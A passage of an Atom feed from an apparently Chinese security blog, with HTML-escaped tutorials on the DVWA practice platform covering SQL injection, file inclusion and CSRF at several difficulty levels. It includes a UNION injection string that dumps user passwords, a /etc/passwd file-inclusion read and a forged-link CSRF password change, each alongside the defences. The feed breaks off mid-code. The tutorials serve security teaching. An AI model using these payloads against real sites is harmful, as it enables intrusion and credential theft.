alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　下面爆出用户名和密码：&lt;br&gt;&lt;img src=&quot;/uploads/10/10-8.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　至此就不继续深入了，接着我们看看第二个级别的SQL注入。&lt;/p&gt;
&lt;h2 id=&quot;（二）Medium级别SQL注入&quot;&gt;&lt;a href=&quot;#（二）Medium级别SQL注入&quot; class=&quot;headerlink&quot; title=&quot;（二）Medium级别SQL注入&quot;&gt;&lt;/a&gt;（二）Medium级别SQL注入&lt;/h2&gt;&lt;p&gt;　　一样我们先看看源码。&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;Submit&#39;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// Retrieve data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $id = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;id&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $id = mysql_real_escape_string($id);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $getid = &lt;span class=&quot;string&quot;&gt;&quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $result = mysql_query($getid) &lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt; . mysql_error() . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $num = mysql_numrows($result);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; ($i &amp;lt; $num) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $first = mysql_result($result,$i,&lt;span class=&quot;string&quot;&gt;&quot;first_name&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $last = mysql_result($result,$i,&lt;span class=&quot;string&quot;&gt;&quot;last_name&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;ID: &#39;&lt;/span&gt; . $id . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;br&amp;gt;First name: &#39;&lt;/span&gt; . $first . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;br&amp;gt;Surname: &#39;&lt;/span&gt; . $last;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $i++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　Medium中的源码跟Low中的源码有两个比较重要的区别，一个是使用了mysql_real_escape_string()函数来转义参数id中的特殊字符，如单引号，这是用来防止SQL注入的一种手段。第二个区别是SQL查询语句中，参数id是被作为数字进行传递进去的，而Low级别中是作为字符传递进SQL语句的。&lt;br&gt;　　为什么说第二个区别也重要呢？因为id是数字的话，我们完全可以不用单引号了，也就跟第一个区别里使用了特殊字符转义的函数一点影响都没有，我们照样构造特殊语句。&lt;br&gt;　　这里直接查询他的用户表来证明：&lt;br&gt;&lt;img src=&quot;/uploads/10/10-9.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　输入的特殊值传递到源码中，经过转义（实际并没有影响，因为没有使用单双引号等特殊字符），构成的SQL语句为：&lt;br&gt;　　SELECT first_name, last_name FROM users WHERE user_id = 1 and 1=2 union select user,password from users&lt;br&gt;　　从语句中就可以看到，我们查询id=1且1=2是永远不成立的，从而执行第二条select语句查询了users表中的user和password字段。&lt;br&gt;　　从这里我们可以看出，php中虽然有防止SQL注入的函数存在，但并不一定就能完全杜绝SQL注入，还要结合程序猿的开发习惯，sql语句的结构，而且最好多个函数和方法配合使用。&lt;/p&gt;
&lt;h2 id=&quot;（三）High级别SQL注入&quot;&gt;&lt;a href=&quot;#（三）High级别SQL注入&quot; class=&quot;headerlink&quot; title=&quot;（三）High级别SQL注入&quot;&gt;&lt;/a&gt;（三）High级别SQL注入&lt;/h2&gt;&lt;p&gt;　　最后我们来看看High级别的源码是如何改善并更好的防止SQL注入的。&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;Submit&#39;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// Retrieve data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $id = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;id&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $id = stripslashes($id);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $id = mysql_real_escape_string($id);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (is_numeric($id))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $getid = &lt;span class=&quot;string&quot;&gt;&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $result = mysql_query($getid) &lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt; . mysql_error() . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $num = mysql_numrows($result);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; ($i &amp;lt; $num) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $first = mysql_result($result,$i,&lt;span class=&quot;string&quot;&gt;&quot;first_name&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $last = mysql_result($result,$i,&lt;span class=&quot;string&quot;&gt;&quot;last_name&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;ID: &#39;&lt;/span&gt; . $id . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;br&amp;gt;First name: &#39;&lt;/span&gt; . $first . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;br&amp;gt;Surname: &#39;&lt;/span&gt; . $last;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $i++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　该级别中，不仅使用mysql_real_escape_string函数转义特殊字符，而且在接下来还做了判断，限制了id的值只能是数字，从而防止SQL注入。从这里，我们基本上就很难再去构造特殊语句进行恶意注入查询数据数据库敏感信息了。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文通过DVWA平台的SQL Injection模块进行SQL注入漏洞的一般演示和原理解析。
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>9.渗透测试平台DVWA之文件包含</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://yoursite.com/渗透测试平台DVWA之文件包含/</id>
    <published>2016-06-10T11:27:32.000Z</published>
    <updated>2016-06-10T11:46:48.871Z</updated>
    
    <content type="html">&lt;p&gt;　　本文通过利用DVWA平台，简单分析了PHP站点中，远程文件包含漏洞和本地文件包含漏洞的原理和利用和防范！&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;文件包含漏洞原理简析&quot;&gt;&lt;a href=&quot;#文件包含漏洞原理简析&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞原理简析&quot;&gt;&lt;/a&gt;文件包含漏洞原理简析&lt;/h2&gt;&lt;p&gt;　　文件包含漏洞，是PHP独有的漏洞，是PHP通过函数引入文件时，没有对引入文件名做合法检验，即没有过滤引入文件时，传入参数是否合法或包含敏感字符，文件等，导致可以读取系统敏感文件信息，如系统密码文件等，甚至直接代码注入，如直接注入一句话木马等，一般风险较高。&lt;br&gt;　　文件包含分为本地文件包含和远程文件包含，本地文件包含指被包含文件存在本地服务器当中，直接使用本地物理路径即可，远程文件包含指被包含文件在另外的服务器上，需要利用url地址来包含，远程文件包含需要开启php配置文件中的allow_url_include，否则无法使用url包含文件，默认php不开启。&lt;/p&gt;
&lt;h2 id=&quot;DVWA平台中Low级别案例&quot;&gt;&lt;a href=&quot;#DVWA平台中Low级别案例&quot; class=&quot;headerlink&quot; title=&quot;DVWA平台中Low级别案例&quot;&gt;&lt;/a&gt;DVWA平台中Low级别案例&lt;/h2&gt;&lt;p&gt;　　Low级别的文件包含漏洞非常简单，我们来看看界面&lt;br&gt;&lt;img src=&quot;/uploads/9/9-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从链接当中可以看到，参数page传入一个值，而这个值是一个文件，那么我们就大概可以猜到，这里引用了外部文件，可能存在风险。&lt;br&gt;　　我们来测试一下，假设我们知道服务器是linux系统（实际渗透中可以通过其他技术获取服务器信息），那么我们改变page参数传入的值。&lt;br&gt;&lt;img src=&quot;/uploads/9/9-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　可以看我，我们改变了传入的值为/etc/passwd，这是linux系统的用户信息文件，直接暴露出来了，这就证明存在文件包含漏洞，我们可以通过该漏洞，任意读取系统文件，查看敏感信息。&lt;br&gt;上面说的是本地文件包含，在Low中还可以做到远程文件包含，不过前提是开启了php中的allow_url_fopen和allow_url_include，在php.ini文件中配置。&lt;br&gt;&lt;img src=&quot;/uploads/9/9-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　我们来看看文件包含效果:&lt;br&gt;&lt;img src=&quot;/uploads/9/9-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　下面是在本地服务器上直接访问phpinfo得到的信息&lt;br&gt;&lt;img src=&quot;/uploads/9/9-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　可以看到，我们获取到的的确是本地服务器的信息。甚至我们可以直接包含木马文件来控制服务器，这里不做演示了。&lt;br&gt;　　最后来看看源码：&lt;br&gt;&lt;img src=&quot;/uploads/9/9-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　源码很简单，直接用GET方法接收传递进来的值，没有做任何处理，这也就导致了攻击者可以随意更改传入参数值来达到文件包含攻击的目的。我们应假设用户的输入并非都是安全的，然后去过滤不安全的值来达到我们的正常访问。&lt;/p&gt;
&lt;h2 id=&quot;DVWA平台中Medium级别案例&quot;&gt;&lt;a href=&quot;#DVWA平台中Medium级别案例&quot; class=&quot;headerlink&quot; title=&quot;DVWA平台中Medium级别案例&quot;&gt;&lt;/a&gt;DVWA平台中Medium级别案例&lt;/h2&gt;&lt;p&gt;　　Medium级别中，对于文件包含漏洞就做了一定的防范手段，我们来看看源码。&lt;br&gt;&lt;img src=&quot;/uploads/9/9-7.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从源码中可以看到，其过滤了&lt;a href=&quot;http://和https://，将其替换为空字符，这也就是说，在一定程度上防范了远程文件包含，然而其并没有对本地文件包含做过滤，也就是说，其仍然存在本地文件包含漏洞。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://和https://，将其替换为空字符，这也就是说，在一定程度上防范了远程文件包含，然而其并没有对本地文件包含做过滤，也就是说，其仍然存在本地文件包含漏洞。&lt;/a&gt;&lt;br&gt;　　首先先来试试远程文件包含&lt;br&gt;&lt;img src=&quot;/uploads/9/9-8.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　没有任何信息，包含失败了，再看看本地的，成功包含&lt;br&gt;&lt;img src=&quot;/uploads/9/9-9.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;DVWA平台中High级别案例&quot;&gt;&lt;a href=&quot;#DVWA平台中High级别案例&quot; class=&quot;headerlink&quot; title=&quot;DVWA平台中High级别案例&quot;&gt;&lt;/a&gt;DVWA平台中High级别案例&lt;/h2&gt;&lt;p&gt;　　现在我们来看看High级别的源码&lt;br&gt;&lt;img src=&quot;/uploads/9/9-10.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　很明显，这个级别利用了白名单的方式，只允许传入文件include.php，否则一律输出错误！&lt;br&gt;　　这是一种比较好的防御方法，无论远程和本地文件包含，利用白名单的形式，都较好的防御了文件包含漏洞攻击。&lt;br&gt;　　本地文件包含尝试结果&lt;br&gt;&lt;img src=&quot;/uploads/9/9-11.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　远程文件包含尝试结果&lt;br&gt;&lt;img src=&quot;/uploads/9/9-12.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文通过利用DVWA平台，简单分析了PHP站点中，远程文件包含漏洞和本地文件包含漏洞的原理和利用和防范！
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>8.渗透测试平台DVWA之CSRF</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0DVWA%E4%B9%8BCSRF/"/>
    <id>http://yoursite.com/渗透测试平台DVWA之CSRF/</id>
    <published>2016-06-09T11:25:00.000Z</published>
    <updated>2016-06-10T11:44:50.207Z</updated>
    
    <content type="html">&lt;p&gt;　　本文简单介绍了CSRF的形成原理，以及以DVWA平台为例，做了简单的利用分析！&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;CSRF原理简单分析&quot;&gt;&lt;a href=&quot;#CSRF原理简单分析&quot; class=&quot;headerlink&quot; title=&quot;CSRF原理简单分析&quot;&gt;&lt;/a&gt;CSRF原理简单分析&lt;/h2&gt;&lt;p&gt;　　CSRF，跨站请求伪造，其主要是通过盗用被攻击者的身份来进行非法操作，如修改你的密码，窃取个人敏感信息，银行转账等。&lt;br&gt;　　具体原理为，当我们登录我们某一网站的账号，如银行网站，登录后我们与浏览器之间便存在了一个可信任的会话连接，而该网站存在CSRF漏洞，那么，此时，如果我们又访问了一个加入了恶意代码的另一个网站，该恶意代码是执行该银行网站的某些敏感操作的，如转账，修改密码等。正常情况下，我们直接访问改网站，没有任何问题，因为这些恶意代码的操作需要用户权限支撑，否则执行失败，然而当我们登录了银行，而会话没有结束时，访问了该网站，那么则执行了这些恶意代码操作，而且是静默的，一般用户并不知情，也就是说，在不知不觉中，用户密码被修改，银行存款被转走等。&lt;br&gt;　　接下来，我们来看看DVWA中对于CSRF的实操。&lt;/p&gt;
&lt;h2 id=&quot;DVWA平台low级别CSRF分析&quot;&gt;&lt;a href=&quot;#DVWA平台low级别CSRF分析&quot; class=&quot;headerlink&quot; title=&quot;DVWA平台low级别CSRF分析&quot;&gt;&lt;/a&gt;DVWA平台low级别CSRF分析&lt;/h2&gt;&lt;p&gt;　　low级别的CSRF模块中，密码修改并没有验证旧密码，直接就可以输入新密码即可。&lt;br&gt;&lt;img src=&quot;/uploads/8/8-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　首先我们先来查看dvwa中的admin的密码hash，以方便我们待会做对比。&lt;br&gt;&lt;img src=&quot;/uploads/8/8-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　然后我们随意输入一个密码，确认密码框里随便输入，不要跟新密码一样，我们现在要获取密码修改的连接或数据包，先不改动密码。&lt;br&gt;&lt;img src=&quot;/uploads/8/8-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从图中可以看到，通过链接请求密码修改的，我们可以尝试在另一个浏览器里面直接访问该链接，发现其跳转到登录去了，因为没有可信任会话，接下来我们构造一个图片网站，嵌入该恶意链接。&lt;br&gt;&lt;img src=&quot;/uploads/8/8-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　访问该网站，就是一个正常的图片&lt;br&gt;&lt;img src=&quot;/uploads/8/8-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　接下来我们用已登录了DVWA的浏览器来访问该网站，依然正常，没有任何异常显示。&lt;br&gt;&lt;img src=&quot;/uploads/8/8-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　然而此时，密码已经修改成功，我们到数据库查看密码hash&lt;br&gt;&lt;img src=&quot;/uploads/8/8-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　可以看到密码hash已经变了，密码变成123456，CSRF攻击成功！&lt;br&gt;　　我们来分析下DVWA中CSRF的low级别源码&lt;br&gt;&lt;img src=&quot;/uploads/8/8-7.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　可以发现，只是做了新密码的两次输入验证，而并没有对来源进行验证，这也就导致了CSRF的跨站请求伪造。&lt;/p&gt;
&lt;h2 id=&quot;DVWA平台medium级别CSRF分析&quot;&gt;&lt;a href=&quot;#DVWA平台medium级别CSRF分析&quot; class=&quot;headerlink&quot; title=&quot;DVWA平台medium级别CSRF分析&quot;&gt;&lt;/a&gt;DVWA平台medium级别CSRF分析&lt;/h2&gt;&lt;p&gt;　　medium级别的CSRF，我们先来看看源码&lt;br&gt;&lt;img src=&quot;/uploads/8/8-8.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　其先判断了请求是否来自于本地，而不是其他站点，那么像low级别那样构造恶意链接便行不通了，但是是否酱紫就安全了呢？&lt;br&gt;从源码中可以看到，其实通过referer来判断请求来源的，也就是客户端浏览器的referer值，然而我们可以通过设置篡改referer值来欺负服务器，我们的请求来源是本地的，从而达到CSRF跨站请求的目的。&lt;br&gt;　　可以在正常网站中，内嵌构造伪造referer值，如php当中，可以嵌入如下代码：&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span 